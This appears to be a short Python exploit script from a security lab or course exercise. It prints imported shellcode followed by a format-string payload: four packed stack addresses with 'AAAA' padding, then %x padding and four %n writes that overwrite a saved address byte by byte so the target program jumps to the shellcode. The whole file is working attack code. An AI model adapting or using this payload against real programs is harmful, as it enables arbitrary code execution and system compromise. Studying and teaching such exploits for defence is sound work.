from __future__ import print_function
from shellcode import shellcode
from struct import pack

print(shellcode, end = "")

print("\"" + pack("<I",0xbffeaa5c) + "AAAA" + pack("<I",0xbffeaa5d) + "AAAA" + pack("<I",0xbffeaa5e) + "AAAA" + pack("<I",0xbffeaa5f) + "AAAA" + "\"" + "%x%x%x%x%x%x%x%x%227x%n%82x%n%92x%n%193x%n", end="")
